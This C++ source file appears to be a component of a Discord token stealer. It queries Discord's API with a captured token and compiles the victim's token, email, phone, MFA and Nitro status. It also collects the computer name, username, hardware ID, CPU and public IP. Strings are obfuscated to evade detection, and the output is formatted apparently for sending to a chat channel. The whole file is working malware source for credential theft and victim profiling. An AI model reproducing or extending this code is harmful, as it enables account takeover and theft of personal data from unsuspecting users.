#include "User.h"

namespace fs = std::filesystem;

void User::local::toLowerCase(char* ptr, size_t size)
{
	for (uint32_t i = 0; i < size; i++) {
		if (isupper(ptr[i]))
			ptr[i] = tolower(ptr[i]);
	}
}

cpr::Response User::Discord::Get_Request(const std::string& token) {
	cpr::Response r = cpr::Get(cpr::Url{ AY_OBFUSCATE("https://discordapp.com/api/v9/users/@me") },
		cpr::Header{ {"Content-Type", "application/json"}, {"Authorization", token} });
	std::ofstream info;
	info.open(this->info_path);
	info << r.text;
	info.close();
	return r;
}

User::Discord::Discord(const std::string& token)
{
	try {
		this->token = token;
		this->Get_Request(token);
		if (!fs::exists(this->info_path))
			return;
		Json::Value info_file;
		std::ifstream cfgfile(this->info_path);
		cfgfile >> info_file;
		// JSON Parsing
		id = info_file["id"].asString();
		std::string name = info_file["username"].asString();
		std::string disc = info_file["discriminator"].asString();
		username = name + "#" + disc;
		std::string av_id = info_file["avatar"].asString();
		avatar = AY_OBFUSCATE("https://cdn.discordapp.com/avatars/");
		avatar.append(id + "/" + av_id);
		email = info_file["email"].asString();
		phone = info_file["phone"].asString();
		locale = info_file["locale"].asString();
		verified = info_file["verified"].asBool();
		mfa_enabled = info_file["mfa_enabled"].asBool();
		nitro = info_file["premium_type"].asInt();
		cfgfile.close();
	}

	catch (...) {
		return;
	}
}

std::string User::Discord::get_token_info()
{
	try {
		std::string token_info = "";
		std::string verified_str, mfa_enabled_str, nitro_str;
		// MFA
		switch (mfa_enabled)
		{
		case false: mfa_enabled_str = "false"; break;
		case true: mfa_enabled_str = "true"; break;
		//default: mfa_enabled_str = AY_OBFUSCATE("error"); break;
		}
		// Verified
		switch (verified)
		{
		case false: verified_str = "false"; break;
		case true: verified_str = "true"; break;
		//default: verified_str = AY_OBFUSCATE("error"); break;
		}
		// Nitro (int)
		switch (nitro)
		{
		case 0: nitro_str = "none"; break;
		case 1: nitro_str = AY_OBFUSCATE("true - classic"); break;
		case 2: nitro_str = AY_OBFUSCATE("true - premium"); break;
		default: nitro_str = "error"; break;
		}

		std::stringstream stream_info;
		stream_info << AY_OBFUSCATE("Token: ") << this->token << "\r\n" \
			<< AY_OBFUSCATE("Username: ") << username << "\r\n" \
			<< AY_OBFUSCATE("ID: ") << id << "\r\n" \
			<< AY_OBFUSCATE("Email: ") << email << "\r\n" \
			<< AY_OBFUSCATE("Phone: ") << phone << "\r\n" \
			<< AY_OBFUSCATE("Locale: ") << locale << "\r\n" \
			<< AY_OBFUSCATE("Verified: ") << verified_str << "\r\n" \
			<< AY_OBFUSCATE("Mfa Enabled: ") << mfa_enabled_str << "\r\n" \
			<< AY_OBFUSCATE("Nitro: ") << nitro_str << "\r\n" \
			<< AY_OBFUSCATE("Avatar: ") << avatar << "\r\n";
		token_info = stream_info.str();
		return token_info;
	}

	catch (const std::exception& e) {
		return e.what();
	}
}

// Ref: https://weseetips.wordpress.com/tag/c-get-cpu-name/
std::string User::PC::get_CPU()
{
	int CPUInfo[4] = { -1 };
	__cpuid(CPUInfo, 0x80000000);
	unsigned int Ids = CPUInfo[0];
	char szCPU[0x40] = { 0 };

	for (unsigned int i = 0x80000000; i <= Ids; ++i)
	{
		__cpuid(CPUInfo, i);
		int size = sizeof(CPUInfo);

		if (i == 0x80000002)
			memcpy(szCPU, CPUInfo, size);
		else if (i == 0x80000003)
			memcpy(szCPU + 16, CPUInfo, size);
		else if (i == 0x80000004)
			memcpy(szCPU + 32, CPUInfo, size);
	}
	return szCPU;
}

std::string User::PC::get_info()
{
	try {
		const char* path_1 = AY_OBFUSCATE("SYSTEM\\CurrentControlSet\\Control\\SystemInformation");
		HW_PROFILE_INFO hardware;
		SYSTEM_INFO siSysInfo;
		GetSystemInfo(&siSysInfo);

		std::string szProcCount = std::to_string(siSysInfo.dwNumberOfProcessors);
		char szComputerName[1024];
		DWORD dwSize = sizeof(szComputerName);
		GetComputerNameA(szComputerName, &dwSize);

		char szUsername[1024];
		DWORD dwUser = sizeof(szUsername);
		GetUserNameA(szUsername, &dwUser);

		std::string sysManufacturer, sysName;
		char buf[1000];
		int ret;
		DWORD sz = 1000;
		ret = RegGetValueA(HKEY_LOCAL_MACHINE, path_1, AY_OBFUSCATE("SystemManufacturer"), RRF_RT_ANY, NULL, &buf[0], &sz);
		local::toLowerCase(buf, strlen(buf));
		sysManufacturer = buf;
		ret = RegGetValueA(HKEY_LOCAL_MACHINE, path_1, AY_OBFUSCATE("SystemProductName"), RRF_RT_ANY, NULL, &buf[0], &sz);
		local::toLowerCase(buf, strlen(buf));
		sysName = buf;

		std::string pc_info = "";
		const char* hwid = "none";
		if (GetCurrentHwProfile(&hardware))
			hwid = hardware.szHwProfileGuid;

		auto ip = cpr::Get(cpr::Url{ AY_OBFUSCATE("https://api.ipify.org/?format=text") }).text;
		char current_module[MAX_PATH];
		GetModuleFileNameA(nullptr, current_module, MAX_PATH);

		std::stringstream stream_info;
		stream_info << AY_OBFUSCATE("```\nComputer name: ") << szComputerName << "\r\n" \
			<< AY_OBFUSCATE("Username: ") << szUsername << "\r\n" \
			<< AY_OBFUSCATE("System Manufacturer: ") << sysManufacturer << "\r\n" \
			<< AY_OBFUSCATE("System Name: ") << sysName << "\r\n" \
			<< AY_OBFUSCATE("Processor: ") << this->get_CPU() << "\r\n" \
			<< AY_OBFUSCATE("Hardware ID: ") << hwid << "\r\n" \
			<< AY_OBFUSCATE("Thread Count: ") << szProcCount << "\r\n" \
			<< AY_OBFUSCATE("Current Path: ") << current_module << "\r\n" \
			<< AY_OBFUSCATE("IP: ") << ip << "\r\n" \
			<< AY_OBFUSCATE("\n```");
		pc_info = stream_info.str();
		return pc_info;
	}

	catch (const std::exception& e) {
		return e.what();
	}
}
